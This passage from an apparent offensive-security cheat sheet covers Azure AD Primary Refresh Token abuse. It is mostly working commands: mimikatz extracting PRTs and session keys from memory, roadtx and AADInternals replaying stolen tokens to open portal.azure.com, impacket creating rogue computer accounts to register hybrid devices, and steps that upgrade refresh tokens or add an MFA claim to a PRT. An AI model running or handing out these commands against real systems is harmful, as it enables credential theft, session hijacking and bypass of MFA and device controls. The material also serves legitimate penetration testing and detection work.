    <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="n">roadtx</span> <span class="n">browserprtauth</span> <span class="p">-</span><span class="n">-prt</span> <span class="p">&lt;</span><span class="n">prt-token</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-prt-sessionkey</span> <span class="p">&lt;</span><span class="n">session-key</span><span class="p">&gt;</span>
<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="n">roadtx</span> <span class="n">browserprtauth</span> <span class="p">-</span><span class="n">-prt</span> <span class="n">roadtx</span><span class="p">.</span><span class="n">prt</span> <span class="n">-url</span> <span class="n">http</span><span class="p">://</span><span class="n">www</span><span class="p">.</span><span class="n">office</span><span class="p">.</span><span class="n">com</span>
</code></pre></div></li>
</ul>
<h3 id="extract-prt-v1-pass-the-prt">Extract PRT v1 - Pass-the-PRT</h3>
<p>MimiKatz (version 2.2.0 and above) can be used to attack (hybrid) Azure AD joined machines for lateral movement attacks via the Primary Refresh Token (PRT) which is used for Azure AD SSO (single sign-on).</p>
<ul>
<li>Use mimikatz to extract the PRT and session key
    <div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="n">mimikatz</span> <span class="c"># privilege::debug</span>
<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="n">mimikatz</span> <span class="c"># token::elevate</span>
<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="n">mimikatz</span> <span class="c"># sekurlsa::cloudap</span>
<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="n">mimikatz</span> <span class="c"># sekurlsa::dpapi</span>
<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="n">mimikatz</span> <span class="c"># dpapi::cloudapkd /keyvalue:&lt;key-value&gt; /unprotect</span>
<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="n">mimikatz</span> <span class="c"># dpapi::cloudapkd /context:&lt;context&gt; /derivedkey:&lt;derived-key&gt; /Prt:&lt;prt&gt;</span>
</code></pre></div></li>
<li>Use either roadtx or AADInternals to generate a new PRT token
    <div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="n">roadtx</span> <span class="n">browserprtauth</span> <span class="p">-</span><span class="n">-prt</span> <span class="p">&lt;</span><span class="n">prt</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-prt-sessionkey</span> <span class="p">&lt;</span><span class="nb">clear-key</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-keep-open</span> <span class="n">-url</span> <span class="n">https</span><span class="p">://</span><span class="n">portal</span><span class="p">.</span><span class="n">azure</span><span class="p">.</span><span class="n">com</span>
<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="n">PS</span><span class="p">&gt;</span> <span class="nb">Import-Module</span> <span class="n">C</span><span class="p">:\</span><span class="n">Tools</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">\</span><span class="n">AADInternals</span><span class="p">.</span><span class="n">psd1</span>
<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$PRT_OF_USER</span> <span class="p">=</span> <span class="s1">&#39;...&#39;</span>
<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="k">while</span><span class="p">(</span><span class="nv">$PRT_OF_USER</span><span class="p">.</span><span class="n">Length</span> <span class="p">%</span> <span class="n">4</span><span class="p">)</span> <span class="p">{</span><span class="nv">$PRT_OF_USER</span> <span class="p">+=</span> <span class="s2">&quot;=&quot;</span><span class="p">}</span>
<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$PRT</span> <span class="p">=</span> <span class="no">[text.encoding]</span><span class="p">::</span><span class="n">UTF8</span><span class="p">.</span><span class="n">GetString</span><span class="p">(</span><span class="no">[convert]</span><span class="p">::</span><span class="n">FromBase64String</span><span class="p">(</span><span class="nv">$PRT_OF_USER</span><span class="p">))</span>
<a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$ClearKey</span> <span class="p">=</span> <span class="s2">&quot;XXYYZZ...&quot;</span>
<a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nv">$SKey</span> <span class="p">=</span> <span class="no">[convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span> <span class="no">[byte[]]</span> <span class="p">(</span><span class="nv">$ClearKey</span> <span class="o">-replace</span> <span class="s1">&#39;..&#39;</span><span class="p">,</span> <span class="s1">&#39;0x$&amp;,&#39;</span> <span class="n">-split</span> <span class="s1">&#39;,&#39;</span> <span class="o">-ne</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
<a id="__codelineno-24-9" name="__codelineno-24-9" href="#__codelineno-24-9"></a><span class="nb">PS </span><span class="n">AADInternals</span><span class="p">&gt;</span> <span class="nb">New-AADIntUserPRTToken</span> <span class="n">-RefreshToken</span> <span class="nv">$PRT</span> <span class="n">-SessionKey</span> <span class="nv">$SKey</span> <span class="n">-GetNonce</span>
</code></pre></div></li>
</ul>
<h3 id="extract-prt-on-device-with-tpm">Extract PRT on Device with TPM</h3>
<ul>
<li>No method known to date.</li>
</ul>
<h3 id="request-a-prt-using-the-refresh-flow">Request a PRT using the Refresh Flow</h3>
<ul>
<li>Request a nonce from AAD: <code>roadrecon auth --prt-init -t &lt;tenant-id&gt;</code></li>
<li>Use <a href="https://github.com/dirkjanm/ROADtoken">dirkjanm/ROADtoken</a> or <a href="https://github.com/wotwot563/aad_prt_bof">wotwot563/aad_prt_bof</a> to initiate a new PRT request.</li>
<li><code>roadrecon auth --prt-cookie &lt;prt-cookie&gt; --tokens-stdout --debug</code> or  <code>roadtx gettoken --prt-cookie &lt;x-ms-refreshtokencredential&gt;</code></li>
<li>Then browse to <a href="login.microsoftonline.com">login.microsoftonline.com </a> with a cookie <code>x-ms-RefreshTokenCredential:&lt;output-from-roadrecon&gt;</code>
    <div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">Name</span><span class="p">:</span> <span class="n">x-ms-RefreshTokenCredential</span>
<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">Value</span><span class="p">:</span> <span class="p">&lt;</span><span class="n">Signed</span> <span class="n">JWT</span><span class="p">&gt;</span>
<a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a><span class="n">HttpOnly</span><span class="p">:</span> <span class="err">√</span>
</code></pre></div></li>
</ul>
<p><img alt="⚠" class="twemoji" src="https://cdn.jsdelivr.net/gh/jdecked/twemoji@15.0.3/assets/svg/26a0.svg" title=":warning:" /> Mark the cookie with the flags <code>HTTPOnly</code> and <code>Secure</code>.</p>
<h3 id="request-a-prt-with-hybrid-device">Request a PRT with Hybrid Device</h3>
<p>Requirements:</p>
<ul>
<li>ADDS user credentials</li>
<li>hybrid environment (ADDS and Azure AD)</li>
</ul>
<p>Use the user account to create a computer and request a PRT</p>
<ul>
<li>Create a computer account in AD: <code>impacket-addcomputer &lt;domain&gt;/&lt;username&gt;:&lt;password&gt; -dc-ip &lt;dc-ip&gt;</code></li>
<li>Configure the computer certificate in AD with <a href="https://github.com/dirkjanm/roadtools_hybrid">dirkjanm/roadtools_hybrid</a>: <code>python setcert.py 10.10.10.10  -t '&lt;machine-account$&gt;' -u '&lt;domain&gt;\&lt;machine-account$&gt;' -p &lt;machine-password&gt;</code></li>
<li>Register the hybrid device in Azure AD with this certificate: <code>roadtx hybriddevice -c '&lt;machine-account&gt;.pem' -k '&lt;machine-account&gt;.key' --sid '&lt;device-sid&gt;' -t '&lt;aad-tenant-id&gt;'</code></li>
<li>
<p>Get a PRT with device claim</p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="n">roadtx</span> <span class="n">prt</span> <span class="n">-c</span> <span class="p">&lt;</span><span class="n">hybrid-device-name</span><span class="p">&gt;.</span><span class="n">pem</span> <span class="n">-k</span> <span class="p">&lt;</span><span class="n">hybrid-device-name</span><span class="p">&gt;.</span><span class="n">key</span> <span class="n">-u</span> <span class="p">&lt;</span><span class="n">username</span><span class="p">&gt;</span><span class="nv">@h</span><span class="p">&lt;</span><span class="n">domain</span><span class="p">&gt;</span> <span class="n">-p</span> <span class="p">&lt;</span><span class="n">password</span><span class="p">&gt;</span>
<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="n">roadtx</span> <span class="n">browserprtauth</span> <span class="p">-</span><span class="n">-prt</span> <span class="p">&lt;</span><span class="n">prt-token</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-prt-sessionkey</span> <span class="p">&lt;</span><span class="n">prt-session-key</span><span class="p">&gt;</span> <span class="p">-</span><span class="n">-keep-open</span> <span class="n">-url</span> <span class="n">https</span><span class="p">://</span><span class="n">portal</span><span class="p">.</span><span class="n">azure</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
</li>
</ul>
<h3 id="upgrade-refresh-token-to-prt">Upgrade Refresh Token to PRT</h3>
<ul>
<li>Get correct token audience: <code>roadtx gettokens -c 29d9ed98-a469-4536-ade2-f981bc1d605e -r urn:ms-drs:enterpriseregistration.windows.net --refresh-token file</code></li>
<li>Registering device: <code>roadtx device -a register -n &lt;device-name&gt;</code></li>
<li>Request PRT <code>roadtx prt --refresh-token &lt;refresh-token&gt; -c &lt;device-name&gt;.pem -k &lt;device-name&gt;.key</code></li>
<li>Use a PRT: <code>roadtx browserprtauth --prt &lt;prt-token&gt; --prt-sessionkey &lt;prt-session-key&gt; --keep-open -url https://portal.azure.com</code></li>
</ul>
<h3 id="enriching-a-prt-with-mfa-claim">Enriching a PRT with MFA claim</h3>
<ul>
<li>Request a special refresh token: <code>roadtx prtenrich -u username@domain</code></li>
<li>Request a PRT with MFA claim: <code>roadtx prt -r &lt;refreshtoken&gt; -c &lt;device&gt;.pem -k &lt;device&gt;.key</code></li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://dirkjanm.io/introducing-roadtools-and-roadrecon-azure-ad-exploration-framework/">Introducing ROADtools - The Azure AD exploration framework - Dirk-jan Mollema - April 16, 2020</a></li>
<li><a href="https://trustedsec.com/blog/hacking-your-cloud-tokens-edition-2-0">Hacking Your Cloud: Tokens Edition 2.0 - Edwin David - April 13, 2023</a></li>
<li><a href="https://developer.microsoft.com/en-us/microsoft-365/dev-program">Microsoft 365 Developer Program</a></li>
<li><a href="https://red.0xbad53c.com/red-team-operations/azure-and-o365/prt-abuse-from-userland-with-cobalt-strike">PRT Abuse from Userland with Cobalt Strike - 0xbad53c</a></li>
<li><a href="https://derkvanderwoude.medium.com/pass-the-prt-attack-and-detection-by-microsoft-defender-for-afd7dbe83c94">Pass-the-PRT attack and detection by Microsoft Defender for … - Derk van der Woude - Jun 9</a></li>
<li><a href="https://aadinternals.com/post/prt/">Journey to Azure AD PRT: Getting access with pass-the-token and pass-the-cert - AADInternals.com - September 01, 2020</a></li>
<li><a href="https://zhiliaxu.github.io/app-service-managed-identity.html">Get Access Tokens for Managed Service Identity on Azure App Service</a></li>
<li><a href="https://blog.netspi.com/attacking-azure-cloud-shell/">Attacking Azure Cloud shell - Karl Fosaaen - December 10, 2019</a></li>
<li><a href="https://medium.com/@mor2464/azure-ad-pass-the-certificate-d0c5de624597">Azure AD Pass The Certificate - Mor - Aug 19, 2020</a></li>
<li><a href="https://blog.netspi.com/azure-privilege-escalation-using-managed-identities/">Azure Privilege Escalation Using Managed Identities - Karl Fosaaen - February 20th, 2020</a></li>
<li><a href="https://www.lares.com/hunting-azure-admins-for-vertical-escalation/">Hunting Azure Admins for Vertical Escalation - LEE KAGAN - MARCH 13, 2020</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 15, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../../..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
    
  </body>
</html>